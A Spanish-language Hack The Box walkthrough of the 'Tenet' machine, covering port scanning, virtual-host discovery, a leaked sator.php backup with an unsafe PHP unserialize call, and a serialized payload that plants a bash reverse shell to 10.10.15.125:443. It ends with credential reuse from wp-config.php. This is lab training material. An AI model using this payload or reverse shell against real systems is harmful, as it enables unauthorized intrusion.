---
title: "Tenet - Hack The Box"
layout: single
excerpt:
show_date: true
classes: wide
header:
  teaser: "https://github.com/Wiinsad/winsad/blob/master/assets/images/machines/HTB/tenet/data/Tenet.png?raw=true"
  teaser_home_page: true
  icon: "assets/images/icons/Hackthebox2.png"
categories:
  - Writeup
  - HackTheBox
tags:
  - Deserialization Attacks
  - Virtual Hosting
  -
---

<p align="center">
<img src="https://raw.githubusercontent.com/Wiinsad/winsad/master/assets/images/machines/HTB/tenet/data/TenetHTB.png">
</p>

 La máquina **Tenet** es una máquina virtual vulnerable de la plataforma HackTheBox con un nivel de dificultad **medio** una calificación en el rank de 4.6, **5039 USER OWNS** y **4475 SYSTEM OWNS** con la ip **10.10.10.223** y un sistema operativo **Linux**.


## Port Scan

Para empezar, hice un escaneo con la herramienta **Nmap** para encontrar los puertos abiertos disponibles en la máquina con **[Ip:10.10.10.214]** utilizando los parámetros:
  - **-p-:**    Escaneo a toda la gama de puertos (65536).
  - **-n:**     No hacen la resolución del DNS.
  - **-T5:**    El parámetro más agresivo y ruidoso pero más rápido para hacer una exploración rápida.
  - **-v:**     Aumenta el nivel de los mensajes verbose.
  - **--open:** Muestra sólo los puertos con un estatus abierto.
  - **-oG:**    Guarda la el output en formato Grepeable.

<p align="center">
<img src="https://github.com/Wiinsad/winsad/blob/master/assets/images/machines/HTB/tenet/scan/scanPort.png?raw=true">
</p>


Una vez que hicimos el escaneo de puertos con la herramienta **ExtractPort**, vemos que los puertos que destacaron en este caso fueron **22,80**:

<p align="center">
<img src="https://github.com/Wiinsad/winsad/blob/master/assets/images/machines/HTB/tenet/scan/Ports.png?raw=true">
</p>


Una vez identificados los puertos abiertos, realizaremos un escaneo de versiones y servicios de estos puertos con la herramienta nmap configurando los siguientes parámetros:

  - -sC: Script de enumeración básica de sondeo en puertos y servicios alojados.
  - -sV: Detección de versiones en servicios alojados en puertos.
  - -p : Puertos a inspeccionar.
  - -oN: Formatos de Nmap en los que se guardará el archivo.

<p align="center">
<img src="https://github.com/Wiinsad/winsad/blob/master/assets/images/machines/HTB/tenet/scan/PortServ.png?raw=true">
</p>

De el escaneo de puertos y servicios no pudimos recolectar mucha informacion solo que en el puerto **22** esta alojado un servicio **ssh** y en el puerto **80** esta alojado un servicio **HTTP**, asi que el camino que seguiremos sera por este serviciom entrando al servicio por el navegador se logra ve lo siguiente:

<p align="center">
<img src="https://github.com/Wiinsad/winsad/blob/master/assets/images/machines/HTB/tenet/scan/web.png?raw=true">
</p>

Un camino para poder descubrir subdirectorios es haciendo un **fuzzing** en la web en este caso usare la herramienta **gobuster**.


Haciendo el fuzzing pude descubrir que hay un wordpress corriendo en la web:

<p align="center">
<img src="https://github.com/Wiinsad/winsad/blob/master/assets/images/machines/HTB/tenet/scan/wordpress.png?raw=true">
</p>

Al entrar a la ruta veo que la pagina se ve como si estuviera mal montada lo que puede ser un indicio de que probablemente se esta haciendo virtual hosting y entrando al código fuente de la pagina de puedo ver efectivamente que en algunas parte del código fuente se hace mención a **tenet.htb** así que agrego este host al **/etc/hosts** y al entrar volver a entrar a la pagina ya carga correctamente.

<p align="center">
<img src="https://github.com/Wiinsad/winsad/blob/master/assets/images/machines/HTB/tenet/scan/web2.png?raw=true">
</p>

<p align="center">
<img src="https://github.com/Wiinsad/winsad/blob/master/assets/images/machines/HTB/tenet/scan/web3_000.png?raw=true">
</p>

<p align="center">
<img src="https://github.com/Wiinsad/winsad/blob/master/assets/images/machines/HTB/tenet/scan/web4.png?raw=true">
</p>

<p align="center">
<img src="https://github.com/Wiinsad/winsad/blob/master/assets/images/machines/HTB/tenet/scan/web5.png?raw=true">
</p>

Ya que podemos ver bien la pagina empezamos a enumerar y buscar información útil. En la pagina se encuentran unos posts y en uno de ellos se menciona que la pagina esta siendo migrada y ese mismo post tiene un comentario de un usuario "**neil**" el cual menciona lo siguiente:


>  did you remove the sator php file and the backup?? the migration program is incomplete! why would you do this?!
>
>-Neil

Ya sabiendo esto sabemos que puede existir un un sator.php y un archivo backup, haciendo fuzzing con gobuster no pude encontrar ningún recurso de estos, ya que tocamos el tema de visual hosting puede que esta misma tenga un subdominio así que probando **backup.tenet.htb** y **sator.tenet.php** ya que son los datos que conocemos y estamos buscamos.

Una vez que los agregamos al **/etc/hosts** y entramos vemos que el subdominio **sator.tenet.htb** nos funciono y ahí se encuentra el recurso **sator.php**.

<p align="center">
<img src="https://github.com/Wiinsad/winsad/blob/master/assets/images/machines/HTB/tenet/scan/sator.png?raw=true">
</p>

En el post se menciona que hay un backup de este recurso así que intente ver si existía un archivo **.bak** y efectivamente así fue había un recurso **sator.php.bak**, este archivo lo pude descargar en mi maquina y contenía lo siguiente:

```bash
<?php

class DatabaseExport
{
	public $user_file = 'users.txt';
	public $data = '';

	public function update_db()
	{
		echo '[+] Grabbing users from text file <br>';
		$this-> data = 'Success';
	}


	public function __destruct()
	{
		file_put_contents(__DIR__ . '/' . $this ->user_file, $this->data);
		echo '[] Database updated <br>';
	//	echo 'Gotta get this working properly...';
	}
}

$input = $_GET['arepo'] ?? '';
$databaseupdate = unserialize($input);

$app = new DatabaseExport;
$app -> update_db();


?>
```

Lo que hace este archivo en php es deserializar un contenido que es envido por **GET** a **aerpo** y el contenido serializado se enviá a la clase **DatabaseExport** ya deserializado lo que hace la clase es actualizar un archivo users.txt que es el nombre que viene ya predefinido y la data que esta en blanco de este archivo pero con la funcion **update_db()** actualiza la data de **users.txt** a **Success** y luego con la clase **__destruct()** elimina el **users.txt** antiguo.

Si entramos a archivo en la url vemos que existe:

<p align="center">
<img src="https://github.com/Wiinsad/winsad/blob/master/assets/images/machines/HTB/tenet/scan/users.png?raw=true">
</p>

Encontre un post el cual explica a detalle como funciona una [**Exploiting PHP Deserialization**](https://medium.com/swlh/exploiting-php-deserialization-56d71f03282a) en el post explica muy bien como explotar esto para poder conseguir un **RCE**.


Con lo visto en la web arme el siguiente archivo php para poder crear un arachivo php el cual contenga una **revershell**

```php
class DatabaseExport{
	public $user_file = 'winsad.php';
        public $data = '<?php exec("/bin/bash -c \'bash -i >& /dev/tcp/10.10.15.125/443 0>&1\'"); ?>';
}

print urlencode(serialize(new DatabaseExport));
```

Lo que hace es crear la clases **DatabaseExport** la cual contiene los mismo valores que requiere el archivo y serializar **sator.php** para poder deserializarlo y actualizar la supuesta base de datos y el contenido es la revershell a mi equipo.
Una vez que ejecuto el php con **php -a** y me pasa la data serializada voy a al recurso **sator.php** le mando por get y a la variable **aerpo** la data serializada:

<p align="center">
<img src="https://github.com/Wiinsad/winsad/blob/master/assets/images/machines/HTB/tenet/intrusion/seria.png?raw=true">
</p>

<p align="center">
<img src="https://github.com/Wiinsad/winsad/blob/master/assets/images/machines/HTB/tenet/intrusion/get.png?raw=true">
</p>

Como se ve en la pagina que **Database updated** intuyo que todo salio correcto así que en teoría si me dirijo a la ruta **http://sator.tenet.htb/winsad.php** el contenido que tiene este archivo php se interpretara dándome la shell. Para esto yo ya estaba en mi maquina en escucha por el puerto 443 que es el puerto que especifique en el php y yendo a la url se ve que efectivamente se interpreta el php y me da la conexión y con ella la shell.

<p align="center">
<img src="https://github.com/Wiinsad/winsad/blob/master/assets/images/machines/HTB/tenet/intrusion/load.png?raw=true">
</p>

<p align="center">
<img src="https://github.com/Wiinsad/winsad/blob/master/assets/images/machines/HTB/tenet/intrusion/shell.png?raw=true">
</p>

Ya que estamos dentro y yendo a la ruta **/var/www/html/wordpress** puedo encontrar un archivo **wp-config.php** el cual contenia las credenciales del usuario **neil** y con estas misma entramos como ese usuario.

<p align="center">
<img src="https://github.com/Wiinsad/winsad/blob/master/assets/images/machines/HTB/tenet/intrusion/neil.png?raw=true">
</p>

<p align="center">
<img src="https://github.com/Wiinsad/winsad/blob/master/assets/images/machines/HTB/tenet/intrusion/neilU.png?raw=true">
</p>
